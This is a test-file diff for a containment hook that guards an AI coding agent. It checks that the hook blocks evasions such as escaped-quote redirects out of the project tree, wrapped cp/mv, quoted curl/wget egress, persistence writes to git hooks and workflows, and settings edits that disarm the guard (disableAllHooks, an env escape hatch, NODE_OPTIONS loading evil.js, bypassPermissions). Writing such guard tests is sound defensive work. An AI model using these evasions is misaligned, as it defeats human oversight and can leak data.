@@ -717,6 +717,337 @@ test('guard ALLOWS in-tree Bash redirects and the /dev/null sink (exit 0)', () =
   }
 });
 
+// ── C2: quote-parse desync (escaped quotes) ──────────────────────────────────
+// The mask toggled quote state on every `"`/`'` with no escape handling, but a
+// backslash-escaped quote is literal text in bash. An odd number of them left
+// the masker "inside a quote", so it blanked a GENUINE `>` and the crossing
+// became invisible — a strictly worse failure than the over-block the mask was
+// added to fix. Every case here exits 0 on the pre-fix guard.
+
+test('guard BLOCKS an out-of-tree redirect hidden behind an escaped quote (exit 2)', () => {
+  for (const command of [
+    'echo "a\\"" > ../out.txt', // escaped quote inside a quoted span
+    'echo \\" > ../out.txt', // bare escaped quote, no span at all
+    'echo "\\"" ; echo x > ../out.txt', // desync also swallows the `;` separator
+    'echo "\\"" ; cp a ../out.txt', // …so the copy in segment 2 was missed too
+    "printf $'a\\'b' > ../out.txt", // ANSI-C quoting DOES honour \' where '…' does not
+  ]) {
+    const res = runGuard({ tool_name: 'Bash', tool_input: { command } });
+    assert.equal(
+      res.status,
+      2,
+      `guard must exit 2 for "${command}" — a backslash-escaped quote is literal text, so it must not toggle quote state and mask away the real redirect/copy; got status ${res.status}, stderr: ${res.stderr}`
+    );
+  }
+});
+
+test('guard BLOCKS a settings/persistence write hidden behind an escaped quote (exit 2)', () => {
+  for (const command of [
+    'echo "a\\"" > .claude/settings.json',
+    'echo "\\"" ; cp a .git/hooks/pre-commit',
+  ]) {
+    const res = runGuard({ tool_name: 'Bash', tool_input: { command } });
+    assert.equal(
+      res.status,
+      2,
+      `guard must exit 2 for "${command}" — the quote desync defeated the SELF-PROTECTION branch, not just the out-of-tree one, so one Bash call could disarm containment or plant persistence; got status ${res.status}, stderr: ${res.stderr}`
+    );
+  }
+});
+
+test('guard still ALLOWS quoted literals after the escape fix (no over-block returns) (exit 0)', () => {
+  for (const command of [
+    'git commit -m "fix: redirect output > ../artifacts"',
+    "echo 'note > ../README'",
+    // The standard bash single-quote-escape idiom. This BLOCKED on the pre-fix
+    // guard — a live over-refusal of exactly the class the mask exists to stop.
+    "git commit -m 'fix: don'\\''t break > ../artifacts'",
+  ]) {
+    const res = runGuard({ tool_name: 'Bash', tool_input: { command } });
+    assert.equal(
+      res.status,
+      0,
+      `guard must allow "${command}" — the escape-aware mask must not reintroduce the quoted-">" over-block it was written to remove; got status ${res.status}, stderr: ${res.stderr}`
+    );
+  }
+});
+
+test('guard BLOCKS an out-of-tree write when the quote parse DESYNCS (raw-scan net) (exit 2)', () => {
+  // PowerShell does not treat `\` as an escape, so `"C:\dir\"` is a COMPLETE
+  // string plus a real redirect. Applying bash escape rules to it leaves the
+  // masker inside an unterminated span — the signature of a desynced parse. The
+  // scan then also reads the raw command, so the crossing cannot hide behind a
+  // quoting form the masker models wrongly. The redirect target uses a forward
+  // slash (`../out.txt`) so it resolves out of tree on POSIX too — a `..\` target
+  // is only out-of-tree under Windows path semantics, which would make this test
+  // Windows-only.
+  const res = runGuard({
+    tool_name: 'PowerShell',
+    tool_input: { command: 'echo "C:\\dir\\" > ../out.txt' },
+  });
+  assert.equal(
+    res.status,
+    2,
+    `guard must exit 2 for a PowerShell trailing-backslash string followed by a real redirect — an unterminated quote span means the mask desynced, so the raw command must be scanned too; got status ${res.status}, stderr: ${res.stderr}`
+  );
+});
+
+// ── C3: cp/mv reached through ordinary shell structure ───────────────────────
+// The copy scan required the segment to START with the literal token `cp`/`mv`,
+// so any wrapper word, path qualification, grouping keyword or newline hid it.
+// All of these exit 0 on the pre-fix guard.
+
+test('guard BLOCKS an out-of-tree copy behind wrappers, paths and shell structure (exit 2)', () => {
+  for (const command of [
+    'echo hi\ncp a ../out.txt', // newline is a separator; the splitter ignored it
+    '/bin/cp a ../out.txt', // path-qualified command word
+    'sudo cp a ../out.txt', // wrapper word
+    'env cp a ../out.txt',
+    '(cp a ../out.txt)', // subshell grouping
+    'if true; then cp a ../out.txt; fi', // keyword opens the segment
+    'cp -t ../ a', // GNU target-directory: dest is NOT the last token
+    'cp a ../out.txt 2>/dev/null', // trailing redirect became the "destination"
+    'install -m 644 a ../out.txt', // install(1) copies too
+    'mv a ../out.txt',
+  ]) {
+    const res = runGuard({ tool_name: 'Bash', tool_input: { command } });
+    assert.equal(
+      res.status,
+      2,
+      `guard must exit 2 for "${command}" — the copy destination resolves out of tree, and ordinary shell structure must not hide the command word; got status ${res.status}, stderr: ${res.stderr}`
+    );
+  }
+});
+
+test('guard does NOT treat a quoted mention of cp/mv as a copy destination (exit 0)', () => {
+  // The command word stays ANCHORED to the segment start. Un-anchoring it would
+  // make the last token of any segment that merely NAMES cp/mv a write target.
+  for (const command of [
+    'git commit -m "mv old ../new"',
+    'git commit -m "cp: tidy up ../docs"',
+    'grep -r "cp " src/',
+  ]) {
+    const res = runGuard({ tool_name: 'Bash', tool_input: { command } });
+    assert.equal(
+      res.status,
+      0,
+      `guard must allow "${command}" — the segment only MENTIONS cp/mv, it does not run one, and treating its last token as a destination is a false block; got status ${res.status}, stderr: ${res.stderr}`
+    );
+  }
+});
+
+// ── C4: redirect targets the guard used to misresolve ────────────────────────
+
+test('guard BLOCKS a redirect to the home directory and a >| clobber (exit 2)', () => {
+  for (const command of [
+    // `~` resolved LEXICALLY to `<root>/~/x` — no `..`, so it read as in-tree and
+    // was allowed while the shell wrote to $HOME.
+    'echo x > ~/out.txt',
+    // `>|` (noclobber override) was not in the redirect pattern at all.
+    'echo x >| ../out.txt',
+  ]) {
+    const res = runGuard({ tool_name: 'Bash', tool_input: { command } });
+    assert.equal(
+      res.status,
+      2,
+      `guard must exit 2 for "${command}" — the target resolves outside the project tree; got status ${res.status}, stderr: ${res.stderr}`
+    );
+  }
+});
+
+test('guard BLOCKS an egress command whose command word is quoted (exit 2)', () => {
+  // The quote sat exactly where EGRESS_RE expected a token boundary, so the
+  // match failed and the egress slipped.
+  for (const command of [
+    '"curl" http://off-box.example/x',
+    "'wget' http://off-box.example/x",
+  ]) {
+    const res = runGuard({ tool_name: 'Bash', tool_input: { command } });
+    assert.equal(
+      res.status,
+      2,
+      `guard must exit 2 for "${command}" — quoting the command word does not change what runs, so it must not evade the egress deny; got status ${res.status}, stderr: ${res.stderr}`
+    );
+  }
+});
+
+// ── C5: the over-refusals the hardening must NOT introduce ───────────────────
+// A containment layer that refuses ordinary work gets switched off, so each
+// tightening above is pinned by the false-positive it must not cause.
+
+test('guard ALLOWS searching the codebase for an egress token (exit 0)', () => {
+  // The egress match normalizes only the COMMAND WORD. A whole-string quote
+  // strip made every quoted MENTION a command-word match, so searching source
+  // for "curl" was refused — a routine implementation action.
+  for (const command of [
+    'grep -rn "curl" src/',
+    'rg "wget" --type js',
+    'git grep "rsync"',
+    "grep 'scp' README.md",
+  ]) {
+    const res = runGuard({ tool_name: 'Bash', tool_input: { command } });
+    assert.equal(
+      res.status,
+      0,
+      `guard must allow "${command}" — the egress name appears as a SEARCH PATTERN, not as the command being run; got status ${res.status}, stderr: ${res.stderr}`
+    );
+  }
+});
+
+test('guard ALLOWS a loopback request carrying a domain in a header value (exit 0)', () => {
+  // Narrowing the quote handling to the command word is what keeps this an
+  // allow: a whole-string strip turned `api.example.com` into a bare token and
+  // read it as an off-box destination.
+  const command =
+    'curl -H "Host: api.example.com" http://localhost:8080/health';
+  const res = runGuard({ tool_name: 'Bash', tool_input: { command } });
+  assert.equal(
+    res.status,
+    0,
+    `guard must allow "${command}" — the request goes to loopback; a domain inside a header value is data, not the destination; got status ${res.status}, stderr: ${res.stderr}`
+  );
+});
+
+test('guard still over-refuses a loopback request carrying a second URL (documented residual) (exit 2)', () => {
+  // Residual #1 in isLoopbackOnlyEgress: EVERY http(s) URL in the command must
+  // be loopback, so a URL inside a `-d` payload is judged as a destination. This
+  // is PRE-EXISTING and documented, not introduced by the quote-handling work —
+  // pinned here so the next person can tell the two apart.
+  const command =
+    'curl -d \'{"callback":"https://api.example.com/x"}\' http://127.0.0.1:3000/hook';
+  const res = runGuard({ tool_name: 'Bash', tool_input: { command } });
+  assert.equal(
+    res.status,
+    2,
+    `this documented over-refusal is expected to remain: every http(s) URL is checked, not just the request target; got status ${res.status}, stderr: ${res.stderr}`
+  );
+});
+
+test('guard ALLOWS a multi-line commit body that mentions a copy (exit 0)', () => {
+  // A newline inside a quoted literal must not split the command, or the copy
+  // scanner is handed a segment made of quoted prose.
+  const command =
+    'git commit -m "chore: notes\n\ncp of the old file kept at ../archive/x"';
+  const res = runGuard({ tool_name: 'Bash', tool_input: { command } });
+  assert.equal(
+    res.status,
+    0,
+    `guard must allow a multi-line commit body that merely mentions a copy — the newline is inside a quoted literal, so it is prose, not a second command; got status ${res.status}, stderr: ${res.stderr}`
+  );
+});
+
+test('guard treats a heredoc BODY as data, but still sees the redirect that opens it', () => {
+  // The body of a heredoc is data. Its quotes must not desync the masker and its
+  // operators must not read as real redirects — otherwise authoring a doc that
+  // contains a shell example is refused.
+  const doc = runGuard({
+    tool_name: 'Bash',
+    tool_input: {
+      command:
+        "cat > notes.md <<'EOF'\nIt's fine to redirect > ../elsewhere in examples\nEOF",
+    },
+  });
+  assert.equal(
+    doc.status,
+    0,
+    `guard must allow authoring a doc whose heredoc body contains a shell example — the body is data, not commands; got status ${doc.status}, stderr: ${doc.stderr}`
+  );
+
+  const real = runGuard({
+    tool_name: 'Bash',
+    tool_input: { command: 'cat > ../out.txt <<EOF\nhello\nEOF' },
+  });
+  assert.equal(
+    real.status,
+    2,
+    `guard must still exit 2 when the heredoc's own redirect target is out of tree — that redirect sits OUTSIDE the body and is a genuine crossing; got status ${real.status}, stderr: ${real.stderr}`
+  );
+});
+
+test('guard does NOT let a quoted "<<TAG" blind the redirect scan (exit 2)', () => {
+  // Heredoc ranges are resolved DURING the quote walk. Computed in a pre-pass
+  // they had no quote state, so a `<<EOF` inside a quoted literal opened a bogus
+  // body that swallowed the rest of the command — every later operator masked,
+  // out-of-tree and persistence writes alike. That is worse than no heredoc
+  // handling at all, so each of these must still block.
+  for (const command of [
+    'echo "<<EOF"\necho x > ../out.txt',
+    ': << NOTE\necho x > ../out.txt',
+    "echo 'a << b'\necho x > ../out.txt",
+    'echo "<<EOF"\necho x > .github/workflows/p.yml',
+  ]) {
+    const res = runGuard({ tool_name: 'Bash', tool_input: { command } });
+    assert.equal(
+      res.status,
+      2,
+      `guard must exit 2 for "${command}" — a heredoc opener inside a quoted literal is text, not a heredoc, and must not neutralize the operators after it; got status ${res.status}, stderr: ${res.stderr}`
+    );
+  }
+});
+
+test('guard ALLOWS ANSI-C quoting beside a quoted ">" (the narrowed desync re-scan) (exit 0)', () => {
+  // `$'…'` is a distinct span type that DOES honour \' — parsing it with the
+  // POSIX single-quote rule closed the span early and desynced the rest of the
+  // command, so a following commit message containing ">" was re-read raw and
+  // over-blocked. Modelling `$'…'` is what separates these from the real
+  // crossing pinned in the escaped-quote suite.
+  for (const command of [
+    "echo $'don\\'t' && git commit -m \"note > ../artifacts\"",
+    "git commit -m \"note > ../artifacts\" && echo $'don\\'t'",
+    'git commit -m "note > ../artifacts" # don\'t forget',
+  ]) {
+    const res = runGuard({ tool_name: 'Bash', tool_input: { command } });
+    assert.equal(
+      res.status,
+      0,
+      `guard must allow "${command}" — the ">" sits inside a quoted commit message and the ANSI-C literal beside it is not a parse failure; got status ${res.status}, stderr: ${res.stderr}`
+    );
+  }
+});
+
+test('guard treats a shell comment as prose, in both directions (exit 0 / exit 2)', () => {
+  // `#` to end-of-line is a comment. Walking it as ordinary text let an
+  // apostrophe in it open a bogus quote span, which (a) desynced the parse so a
+  // later quoted ">" was re-read raw and over-blocked, and (b) swallowed the
+  // newline separating the comment from a real command on the next line.
+  for (const command of [
+    '# don\'t clobber the tree\ngit commit -m "chore: pipe logs > ../tmp/out"',
+    '# it\'s fine\necho "result > ../out.txt"',
+    // A `<<` with no following newline cannot open a heredoc — it is an
+    // arithmetic shift, and treating it as one armed the raw re-scan.
+    'echo $((1 << n)) && git commit -m "note > ../artifacts"',
+  ]) {
+    const res = runGuard({ tool_name: 'Bash', tool_input: { command } });
+    assert.equal(
+      res.status,
+      0,
+      `guard must allow "${command}" — an apostrophe or "<<" inside a comment is prose and must not desync the parse into re-reading a quoted ">" as a real redirect; got status ${res.status}, stderr: ${res.stderr}`
+    );
+  }
+  for (const command of [
+    "# don't\ncp secrets.txt ../out.txt",
+    "# don't\ndd if=data.txt of=../leak.txt",
+  ]) {
+    const res = runGuard({ tool_name: 'Bash', tool_input: { command } });
+    assert.equal(
+      res.status,
+      2,
+      `guard must exit 2 for "${command}" — the comment must not hide the real command on the next line; got status ${res.status}, stderr: ${res.stderr}`
+    );
+  }
+});
+
+test('guard BLOCKS a copy hidden behind a wrapper option that takes an argument (exit 2)', () => {
+  for (const command of ['sudo -u root cp a ../out.txt', 'cp -t../ a']) {
+    const res = runGuard({ tool_name: 'Bash', tool_input: { command } });
+    assert.equal(
+      res.status,
+      2,
+      `guard must exit 2 for "${command}" — an option's argument must not be mistaken for the command word, and an attached -t value is still a target directory; got status ${res.status}, stderr: ${res.stderr}`
+    );
+  }
+});
+
 // ── Cross-namespace paths on a Windows host ─────────────────────────────────
 // The default Windows breach vector, found by a real `claude -p` E2E run: the
 // model emits a POSIX absolute path (Claude Code's tools are POSIX-oriented) —
@@ -898,38 +1229,442 @@ test('guard FAILS OPEN for every call when AWOS_CONTAINMENT_OFF=1 (exit 0)', () 
 // tree, so the out-of-tree rule protects it — it is no longer on this in-tree
 // denylist.
 
-test('guard BLOCKS a Write to .claude/settings.local.json (self-disarm) (exit 2)', () => {
-  const target = path.join(ROOT, '.claude', 'settings.local.json');
-  const res = runGuard({
-    tool_name: 'Write',
-    tool_input: { file_path: target, content: '{}' },
-    cwd: ROOT,
-  });
+// ── Settings files: INVARIANT, not blanket deny ──────────────────────────────
+// A blanket deny on .claude/settings*.json denied the ROLLBACK of a registry
+// hook install (/awos:hire removes the entry its CLI added) while the install
+// itself — performed inside an `npx` subprocess the command parse cannot see —
+// went through. The guard denied the undo and permitted the do. The contract is
+// now an invariant: any settings edit is allowed as long as containment is left
+// ARMED afterwards. These tests use a REAL temp project, because the check reads
+// the on-disk file to compare before/after.
+
+/** A real temp project whose .claude/settings.json has containment armed. */
+function seedProject(settings) {
+  const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'awos-guard-'));
+  fs.mkdirSync(path.join(dir, '.claude'), { recursive: true });
+  fs.writeFileSync(
+    path.join(dir, '.claude', 'settings.json'),
+    JSON.stringify(settings, null, 2)
+  );
+  return dir;
+}
+
+// What the installer actually leaves behind: the plugin ENABLED and the
+// marketplace it loads from REGISTERED. Both matter — dropping the marketplace
+// entry unregisters the plugin just as effectively as flipping the flag.
+const ARMED = {
+  enabledPlugins: { 'awos-containment@awos-marketplace': true },
+  extraKnownMarketplaces: {
+    'awos-marketplace': {
+      source: { source: 'github', repo: 'provectus/awos' },
+    },
+  },
+  hooks: { PreToolUse: [] },
+};
+
+test('guard BLOCKS a settings Write that disables the containment plugin (exit 2)', () => {
+  const dir = seedProject(ARMED);
+  const target = path.join(dir, '.claude', 'settings.json');
+  const res = runGuard(
+    {
+      tool_name: 'Write',
+      tool_input: {
+        file_path: target,
+        content: JSON.stringify({
+          enabledPlugins: { 'awos-containment@awos-marketplace': false },
+        }),
+      },
+      cwd: dir,
+    },
+    { CLAUDE_PROJECT_DIR: dir }
+  );
   assert.equal(
     res.status,
     2,
-    `guard must exit 2 to block a Write to .claude/settings.local.json (${target}) — an in-tree write that could strip the enabledPlugins entry and disarm containment; got status ${res.status}, stderr: ${res.stderr}`
+    `guard must exit 2 for a settings Write that flips the containment plugin to false — flipping the value REMOVES nothing, so a "block deletions" rule would wave it through; the contract is that containment must still be armed after the write. Got status ${res.status}, stderr: ${res.stderr}`
   );
   assert.match(
     res.stderr,
-    /protected in-tree path/,
-    `the block reason must name the protected-in-tree branch; stderr: ${res.stderr}`
+    /disarms|disabled or all hooks off/,
+    `the block reason must name the disarm invariant, not the protected-path branch; stderr: ${res.stderr}`
   );
 });
 
-test('guard BLOCKS an Edit to .claude/settings.json (hook de-registration) (exit 2)', () => {
-  const target = path.join(ROOT, '.claude', 'settings.json');
-  const res = runGuard({
-    tool_name: 'Edit',
-    tool_input: { file_path: target, old_string: 'PreToolUse', new_string: '' },
-    cwd: ROOT,
-  });
+test('guard BLOCKS a settings Edit that introduces disableAllHooks (exit 2)', () => {
+  const dir = seedProject(ARMED);
+  const target = path.join(dir, '.claude', 'settings.json');
+  const res = runGuard(
+    {
+      tool_name: 'Edit',
+      tool_input: {
+        file_path: target,
+        old_string: '{\n  "enabledPlugins"',
+        new_string: '{\n  "disableAllHooks": true,\n  "enabledPlugins"',
+      },
+      cwd: dir,
+    },
+    { CLAUDE_PROJECT_DIR: dir }
+  );
   assert.equal(
     res.status,
     2,
-    `guard must exit 2 to block an Edit to .claude/settings.json (${target}) — removing the hook registration disarms the guard; got status ${res.status}`
+    `guard must exit 2 for a settings Edit that adds "disableAllHooks": true — a one-key kill switch that disarms every hook while leaving the enabledPlugins entry intact. Got status ${res.status}, stderr: ${res.stderr}`
   );
-  assert.match(res.stderr, /protected in-tree path/);
+  assert.match(
+    res.stderr,
+    /disabled, unregistered, or all hooks off/,
+    `the block must come from the disarm invariant, not the old blanket denylist — the exit code alone passes for the wrong reason on a blanket-deny guard; stderr: ${res.stderr}`
+  );
+});
+
+test('guard ALLOWS a settings Edit that leaves containment armed (the /awos:hire rollback) (exit 0)', () => {
+  const dir = seedProject({
+    ...ARMED,
+    hooks: { PreToolUse: [{ matcher: 'Bash', hooks: [{ command: 'fmt' }] }] },
+  });
+  const target = path.join(dir, '.claude', 'settings.json');
+  const before = fs.readFileSync(target, 'utf8');
+  const withoutHook = JSON.stringify(
+    { ...ARMED, hooks: { PreToolUse: [] } },
+    null,
+    2
+  );
+  const res = runGuard(
+    {
+      tool_name: 'Edit',
+      tool_input: {
+        file_path: target,
+        old_string: before,
+        new_string: withoutHook,
+      },
+      cwd: dir,
+    },
+    { CLAUDE_PROJECT_DIR: dir }
+  );
+  assert.equal(
+    res.status,
+    0,
+    `guard must ALLOW a settings edit that removes an unrelated registry hook while leaving containment armed — this is /awos:hire's rollback path, and blocking it denied the undo of an install the guard had already permitted. Got status ${res.status}, stderr: ${res.stderr}`
+  );
+});
+
+test('guard ALLOWS a settings write in a project where containment was never armed (exit 0)', () => {
+  const dir = seedProject({ hooks: {} });
+  const target = path.join(dir, '.claude', 'settings.json');
+  const res = runGuard(
+    {
+      tool_name: 'Write',
+      tool_input: { file_path: target, content: '{"hooks":{}}' },
+      cwd: dir,
+    },
+    { CLAUDE_PROJECT_DIR: dir }
+  );
+  assert.equal(
+    res.status,
+    0,
+    `guard must not police a settings file it has no stake in — containment was never armed here, so there is nothing to disarm; over-refusing would break ordinary settings work. Got status ${res.status}, stderr: ${res.stderr}`
+  );
+});
+
+test('guard BLOCKS a disarm written to settings.local.json (merged-stack invariant) (exit 2)', () => {
+  // Settings are a MERGED stack — settings.local.json OVERRIDES settings.json —
+  // but the installer arms only settings.json. Evaluating one file in isolation
+  // meant a fresh local file started from "not armed", so taking containment
+  // away looked like taking nothing away: one Write disarmed the guard.
+  for (const content of [
+    '{"disableAllHooks": true}',
+    '{"enabledPlugins":{"awos-containment@awos-marketplace":false}}',
+  ]) {
+    const dir = seedProject(ARMED);
+    const res = runGuard(
+      {
+        tool_name: 'Write',
+        tool_input: {
+          file_path: path.join(dir, '.claude', 'settings.local.json'),
+          content,
+        },
+        cwd: dir,
+      },
+      { CLAUDE_PROJECT_DIR: dir }
+    );
+    assert.equal(
+      res.status,
+      2,
+      `guard must exit 2 for a settings.local.json write of ${content} — the local file overrides the project file, so the invariant has to be evaluated over the merged stack, not per-file; got status ${res.status}, stderr: ${res.stderr}`
+    );
+    assert.match(
+      res.stderr,
+      /disabled, unregistered, or all hooks off/,
+      `the block must name the disarm invariant — a blanket denylist would also exit 2 here, so asserting the code alone cannot tell the two apart; stderr: ${res.stderr}`
+    );
+  }
+});
+
+test('guard BLOCKS unregistering or repointing the containment marketplace (exit 2)', () => {
+  // Enablement alone is not "armed": dropping the marketplace entry unregisters
+  // the plugin, and repointing its source swaps WHICH CODE runs as the guard —
+  // a substitution that leaves the enablement flag nominally true.
+  const cases = [
+    [
+      'drops the marketplace registration',
+      JSON.stringify({
+        enabledPlugins: { 'awos-containment@awos-marketplace': true },
+      }),
+      /disabled, unregistered, or all hooks off/,
+    ],
+    [
+      'repoints the marketplace at another repo',
+      JSON.stringify({
+        enabledPlugins: { 'awos-containment@awos-marketplace': true },
+        extraKnownMarketplaces: {
+          'awos-marketplace': {
+            source: { source: 'github', repo: 'someone-else/other' },
+          },
+        },
+      }),
+      /would repoint the marketplace/,
+    ],
+  ];
+  for (const [what, content, reason] of cases) {
+    const dir = seedProject(ARMED);
+    const res = runGuard(
+      {
+        tool_name: 'Write',
+        tool_input: {
+          file_path: path.join(dir, '.claude', 'settings.json'),
+          content,
+        },
+        cwd: dir,
+      },
+      { CLAUDE_PROJECT_DIR: dir }
+    );
+    assert.equal(
+      res.status,
+      2,
+      `guard must exit 2 for a settings write that ${what} — containment is armed by enablement AND registration, and substituting the source is worse than disabling; got status ${res.status}, stderr: ${res.stderr}`
+    );
+    assert.match(
+      res.stderr,
+      reason,
+      `the reason must distinguish unregistering from repointing — they are different failures and only the message separates them; stderr: ${res.stderr}`
+    );
+  }
+});
+
+test('guard simulates an Edit literally, so a "$&" replacement cannot fake the invariant (exit 2)', () => {
+  // String.replace performs $-substitution even for a string pattern, so an Edit
+  // with new_string "$&" simulated to an UNCHANGED, still-armed file and was
+  // allowed — while the real Edit wrote the literal "$&" and left settings.json
+  // as invalid JSON. The simulation has to match the tool byte for byte.
+  const dir = seedProject(ARMED);
+  const res = runGuard(
+    {
+      tool_name: 'Edit',
+      tool_input: {
+        file_path: path.join(dir, '.claude', 'settings.json'),
+        old_string: '"awos-containment@awos-marketplace": true',
+        new_string: '$&',
+      },
+      cwd: dir,
+    },
+    { CLAUDE_PROJECT_DIR: dir }
+  );
+  assert.equal(
+    res.status,
+    2,
+    `guard must exit 2 — simulating with String.replace expands "$&" and verifies a file the tool will never produce; got status ${res.status}, stderr: ${res.stderr}`
+  );
+});
+
+test('guard ALLOWS a settings rewrite that only reorders keys (exit 0)', () => {
+  // The marketplace repoint check compares VALUES, not formatting: any
+  // prettier/jq/agent rewrite of settings.json reorders keys, and a key-order
+  // sensitive compare read that benign reformat as a marketplace substitution.
+  const dir = seedProject(ARMED);
+  const reordered = JSON.stringify({
+    extraKnownMarketplaces: {
+      'awos-marketplace': {
+        source: { repo: 'provectus/awos', source: 'github' },
+      },
+    },
+    enabledPlugins: { 'awos-containment@awos-marketplace': true },
+  });
+  const res = runGuard(
+    {
+      tool_name: 'Write',
+      tool_input: {
+        file_path: path.join(dir, '.claude', 'settings.json'),
+        content: reordered,
+      },
+      cwd: dir,
+    },
+    { CLAUDE_PROJECT_DIR: dir }
+  );
+  assert.equal(
+    res.status,
+    0,
+    `guard must allow a settings rewrite whose marketplace value is identical but key-ordered differently — that is a reformat, not a repoint; got status ${res.status}, stderr: ${res.stderr}`
+  );
+});
+
+test('guard BLOCKS settings writes that neuter it without touching the enablement flag (exit 2)', () => {
+  // The "is the plugin still enabled" check cannot see these. `env` applies to
+  // every session and to the hook subprocess itself, so it sets this guard's own
+  // escape hatch from inside a run — which would make the documented
+  // environment-variable-only opt-out circular after all. bypassPermissions is
+  // the one mode where the platform stops backstopping writes to .claude/.
+  const armedBase = {
+    enabledPlugins: { 'awos-containment@awos-marketplace': true },
+    extraKnownMarketplaces: {
+      'awos-marketplace': {
+        source: { source: 'github', repo: 'provectus/awos' },
+      },
+    },
+  };
+  for (const [what, extra, reason] of [
+    [
+      'sets the escape hatch through settings env',
+      { env: { AWOS_CONTAINMENT_OFF: '1' } },
+      /through settings `env`/,
+    ],
+    [
+      'repoints CLAUDE_PROJECT_DIR through settings env',
+      { env: { CLAUDE_PROJECT_DIR: '/' } },
+      /through settings `env`/,
+    ],
+    [
+      'requires arbitrary code into the guard process via NODE_OPTIONS',
+      { env: { NODE_OPTIONS: '--require ./evil.js' } },
+      /through settings `env`/,
+    ],
+    [
+      'sets the hatch under a lowercase env key (Windows folds case)',
+      { env: { awos_containment_off: '1' } },
+      /through settings `env`/,
+    ],
+    [
+      'defaults the project to bypassPermissions',
+      { permissions: { defaultMode: 'bypassPermissions' } },
+      /bypassPermissions/,
+    ],
+    [
+      'registers a new hook command',
+      {
+        hooks: {
+          PreToolUse: [
+            {
+              matcher: '*',
+              hooks: [{ type: 'command', command: 'node x.js' }],
+            },
+          ],
+        },
+      },
+      /register a new hook command/,
+    ],
+  ]) {
+    const dir = seedProject(ARMED);
+    const res = runGuard(
+      {
+        tool_name: 'Write',
+        tool_input: {
+          file_path: path.join(dir, '.claude', 'settings.json'),
+          content: JSON.stringify({ ...armedBase, ...extra }),
+        },
+        cwd: dir,
+      },
+      { CLAUDE_PROJECT_DIR: dir }
+    );
+    assert.equal(
+      res.status,
+      2,
+      `guard must exit 2 for a settings write that ${what} — it leaves enabledPlugins intact, so the enablement check alone waves it through while containment is effectively gone; got status ${res.status}, stderr: ${res.stderr}`
+    );
+    assert.match(
+      res.stderr,
+      reason,
+      `the reason must name the specific neutering channel; stderr: ${res.stderr}`
+    );
+  }
+});
+
+test('guard ALLOWS removing a hook entry — additions are persistence, removals are not (exit 0)', () => {
+  // This is /awos:hire's rollback. Blocking hook CHANGES wholesale would deny it
+  // again; only additions can plant anything.
+  const dir = seedProject({
+    ...ARMED,
+    hooks: {
+      PostToolUse: [
+        { matcher: 'Write', hooks: [{ type: 'command', command: 'npx fmt' }] },
+      ],
+    },
+  });
+  const res = runGuard(
+    {
+      tool_name: 'Write',
+      tool_input: {
+        file_path: path.join(dir, '.claude', 'settings.json'),
+        content: JSON.stringify(ARMED),
+      },
+      cwd: dir,
+    },
+    { CLAUDE_PROJECT_DIR: dir }
+  );
+  assert.equal(
+    res.status,
+    0,
+    `guard must allow a settings write that REMOVES a registry hook while leaving containment armed — removing a hook cannot plant execution, and denying it would re-break the rollback path; got status ${res.status}, stderr: ${res.stderr}`
+  );
+});
+
+test('guard ALLOWS a settings write that leaves the env block unchanged or removes it (exit 0)', () => {
+  // Only NEW/CHANGED env keys are policed — an edit that keeps an existing env
+  // block, or drops it, must pass, or the env check would over-block ordinary
+  // settings work.
+  for (const [seed, write] of [
+    [
+      { ...ARMED, env: { FOO: 'bar' } },
+      { ...ARMED, env: { FOO: 'bar' }, model: 'opus' }, // env unchanged
+    ],
+    [
+      { ...ARMED, env: { FOO: 'bar' } },
+      ARMED, // env removed
+    ],
+  ]) {
+    const dir = seedProject(seed);
+    const res = runGuard(
+      {
+        tool_name: 'Write',
+        tool_input: {
+          file_path: path.join(dir, '.claude', 'settings.json'),
+          content: JSON.stringify(write),
+        },
+        cwd: dir,
+      },
+      { CLAUDE_PROJECT_DIR: dir }
+    );
+    assert.equal(
+      res.status,
+      0,
+      `guard must allow a settings write that does not introduce or change an env key — only additions/changes can neuter the guard; got status ${res.status}, stderr: ${res.stderr}`
+    );
+  }
+});
+
+test('guard BLOCKS a Bash redirect into a settings file (content is unverifiable) (exit 2)', () => {
+  const dir = seedProject(ARMED);
+  const res = runGuard(
+    {
+      tool_name: 'Bash',
+      tool_input: { command: 'echo "{}" > .claude/settings.json' },
+      cwd: dir,
+    },
+    { CLAUDE_PROJECT_DIR: dir }
+  );
+  assert.equal(
+    res.status,
+    2,
+    `a shell redirect into a settings file carries no inspectable content, so the disarm invariant cannot be evaluated — an unverifiable write to the file that arms containment stays denied. Got status ${res.status}, stderr: ${res.stderr}`
+  );
 });
 
 test('guard BLOCKS a Write to .mcp.json (protected in-tree path) (exit 2)', () => {
@@ -949,7 +1684,10 @@ test('guard BLOCKS a Write to .mcp.json (protected in-tree path) (exit 2)', () =
 
 test('guard BLOCKS Bash writes to persistence sinks (.git/hooks, .github/workflows) (exit 2)', () => {
   for (const command of [
-    'echo "curl evil|sh" > .git/hooks/pre-commit',
+    // The payload deliberately names no egress token: an egress-shaped string
+    // inside it would block at the EGRESS branch first and never exercise the
+    // protected-in-tree contract this test is about.
+    'echo "#!/bin/sh" > .git/hooks/pre-commit',
     'printf "on: push" > .github/workflows/ci.yml',
     'cp payload.json .claude/settings.local.json',
   ]) {
@@ -1013,7 +1751,9 @@ test('guard protects its own files case-insensitively on a case-insensitive FS',
   // the host filesystem treats as the same path.
   const caseInsensitive =
     process.platform === 'win32' || process.platform === 'darwin';
-  const target = path.join(ROOT, '.Claude', 'Settings.json');
+  // .mcp.json is still a BLANKET protected path, so it pins the case-folding
+  // contract without depending on the settings invariant's on-disk state.
+  const target = path.join(ROOT, '.MCP.json');
   const res = runGuard({
     tool_name: 'Write',
     tool_input: { file_path: target, content: 'x' },
@@ -1023,7 +1763,7 @@ test('guard protects its own files case-insensitively on a case-insensitive FS',
   assert.equal(
     res.status,
     want,
-    `on a ${caseInsensitive ? 'case-insensitive' : 'case-sensitive'} host FS, a case-variant of .claude/settings.json (${target}) must ${caseInsensitive ? 'BLOCK (same underlying file)' : 'be ALLOWED (a genuinely different file)'}; got status ${res.status}, stderr: ${res.stderr}`
+    `on a ${caseInsensitive ? 'case-insensitive' : 'case-sensitive'} host FS, a case-variant of .mcp.json (${target}) must ${caseInsensitive ? 'BLOCK (same underlying file)' : 'be ALLOWED (a genuinely different file)'}; got status ${res.status}, stderr: ${res.stderr}`
   );
 });
 
